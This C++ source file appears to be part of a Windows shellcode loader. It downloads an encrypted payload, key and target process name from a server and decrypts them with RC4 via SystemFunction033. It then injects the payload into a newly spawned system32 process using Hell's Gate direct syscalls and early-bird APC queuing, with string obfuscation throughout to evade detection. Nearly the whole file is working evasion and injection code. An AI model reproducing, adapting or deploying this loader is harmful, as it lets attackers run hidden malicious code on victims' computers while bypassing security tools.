#include "../vendor.h"

static int writer(char* data, size_t size, size_t nmemb, std::string* writerData)
{
	if (writerData == NULL)
		return 0;

	writerData->append(data, size * nmemb);

	return size * nmemb;
}

static bool rc4(std::vector<unsigned char> pRc4Key, std::vector<unsigned char>& pPayloadData, DWORD dwRc4KeySize, DWORD sPayloadSize)
{
	NTSTATUS STATUS = NULL;

	USTRING Key;
	Key.Buffer = pRc4Key.data();
	Key.Length = dwRc4KeySize;
	Key.MaximumLength = dwRc4KeySize;

	USTRING Data;
	Data.Buffer = pPayloadData.data();
	Data.Length = sPayloadSize;
	Data.MaximumLength = sPayloadSize;

	HMODULE advapi32Module = LoadLibraryA(AY_OBFUSCATE("Advapi32"));
	if (advapi32Module == NULL)
	{
		return false;
	}

	fnSystemFunction033 SystemFunction033 = (fnSystemFunction033)GetProcAddress(advapi32Module, AY_OBFUSCATE("SystemFunction033"));

	if ((STATUS = SystemFunction033(&Data, &Key)) != 0x0)
	{
		FreeLibrary(advapi32Module);
		return false;
	}

	FreeLibrary(advapi32Module);

	return true;
}

bool app::retrieve()
{
	const char* url = AY_OBFUSCATE("http://localhost/api/v1/get.php?id=");

	std::string content;

	std::string final = std::string(url) + API_KEY;

	curl_global_init(CURL_GLOBAL_ALL);
	CURL* curl = nullptr;

	long status_code = 0;

	curl = curl_easy_init();
	if (curl)
	{
		curl_easy_setopt(curl, CURLOPT_URL, final.c_str());
		curl_easy_setopt(curl, CURLOPT_WRITEDATA, &content);
		curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, writer);

		CURLcode code = curl_easy_perform(curl);

		curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &status_code);

		curl_easy_cleanup(curl);
	}
	curl_global_cleanup();

	if (status_code != 200)
		return false;
	
	std::string decoded = base64_decode(content);
	
	nlohmann::json data = nlohmann::json::parse(decoded);

	const char* key = AY_OBFUSCATE("key");
	const char* payload = AY_OBFUSCATE("payload");
	const char* process = AY_OBFUSCATE("process");

	this->m_key = utils::get()->string_parser(data[key]);
	this->m_payload = utils::get()->string_parser(data[payload]);
	this->m_process = data[process];

	this->m_size = this->m_payload.size();
	this->m_keysize = this->m_key.size();

	printf(AY_OBFUSCATE("+ data received\n"));

	printf(AY_OBFUSCATE("+ encrypted payload :\n"));
	utils::get()->print_hex_array(this->m_payload);

	printf(AY_OBFUSCATE("\n\n+ encryption key :\n"));
	utils::get()->print_hex_array(this->m_key);
		
	return true;
}

auto app::invoke() -> bool
{
	m_sysinfo.StartupInfo.cb = sizeof(STARTUPINFOEX);
	char winpath[0xff];

	if (!protect::get()->get_environment_variable_a(AY_OBFUSCATE("WINDIR"), winpath, MAX_PATH))
		return false;

	const char* sys32 = AY_OBFUSCATE("\\system32\\");
	const char* ebg = AY_OBFUSCATE(" -Embedding");

	m_args = std::string(winpath) + sys32 + this->m_process + ebg;
	std::string windir = std::string(winpath) + sys32;

	if (!protect::get()->create_process_a(NULL, const_cast<char*>(m_args.c_str()), NULL, NULL, FALSE, DEBUG_PROCESS, NULL, windir.c_str(), (LPSTARTUPINFOA)&m_sysinfo.StartupInfo, &m_procinfo)) // todo improve to NtCreatePRocess
		return false;

	this->m_pid = m_procinfo.dwProcessId;
	this->m_handle = m_procinfo.hProcess;
	this->m_thread = m_procinfo.hThread;
	
	printf(AY_OBFUSCATE("+ process (%s) has been created [%i]\n"), m_process.c_str(), m_pid);

	if (!m_pid || !m_handle || !m_thread)
		return false;

	return true;
}

auto app::write(IN PVX_TABLE pVxTable) -> bool
{	
	NTSTATUS	STATUS = 0x00;

	if (!rc4(this->m_key, this->m_payload, this->m_keysize, this->m_size))
		return false;

	printf(AY_OBFUSCATE("+ decrypted payload :\n"));
	utils::get()->print_hex_array(this->m_payload);

	printf(AY_OBFUSCATE("\n+ payload has been decrypted\n"));

	HellsGate(pVxTable->NtAllocateVirtualMemory.wSystemCall);
	if ((STATUS = HellDescent(this->m_handle, &this->m_address, 0, &this->m_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) != 0)
	{
		printf(AY_OBFUSCATE("- NtAllocateVirtualMemory failed with error : 0x%0.8X\n"), STATUS);
		return FALSE;
	}

	if (!m_address)
		return false;

	printf(AY_OBFUSCATE("+ memory has been allocated @ %p\n"), this->m_address);
	
	SIZE_T byte_written = 0;
	HellsGate(pVxTable->NtWriteVirtualMemory.wSystemCall);
	if ((STATUS = HellDescent(m_handle, m_address, this->m_payload.data(), this->m_size, &byte_written)) != 0 || byte_written != this->m_size)
	{
		printf(AY_OBFUSCATE("- NtWriteVirtualMemory failed with error : 0x%0.8X\n"), STATUS);
		return FALSE;
	}

	printf(AY_OBFUSCATE("+ payload has been writed\n"));

	this->m_payload.clear();

	DWORD dwOldProtection = NULL;
	HellsGate(pVxTable->NtProtectVirtualMemory.wSystemCall);
	if ((STATUS = HellDescent(this->m_handle, &m_address, &this->m_size, PAGE_EXECUTE_READ, &dwOldProtection)) != 0)
	{
		printf(AY_OBFUSCATE("- NtProtectVirtualMemory failed with error : 0x%0.8X\n"), STATUS);
		return false;
	}

	printf(AY_OBFUSCATE(("+ page has been set to rx\n")));

	return true;
}

auto app::run(IN PVX_TABLE pVxTable) -> bool
{
	NTSTATUS	STATUS = 0x00;

	HellsGate(pVxTable->NtQueueApcThread.wSystemCall);
	if ((STATUS = HellDescent(m_thread, (PAPCFUNC)m_address, NULL, NULL, NULL)) != 0) 
	{
		printf(AY_OBFUSCATE("- NtQueueApcThread failed with error : 0x%0.8X\n"), STATUS);
		return false;
	}

	protect::get()->debug_active_process_stop(m_pid);

	HellsGate(pVxTable->NtClose.wSystemCall);
	if ((STATUS = HellDescent(m_handle)) != 0)
	{
		printf(AY_OBFUSCATE("- NtClose failed with error : 0x%0.8X\n"), STATUS);
		return false;
	}

	HellsGate(pVxTable->NtClose.wSystemCall);
	if ((STATUS = HellDescent(m_thread)) != 0)
	{
		printf(AY_OBFUSCATE("- NtClose failed with error : 0x%0.8X\n"), STATUS);
		return false;
	}

	return true;
}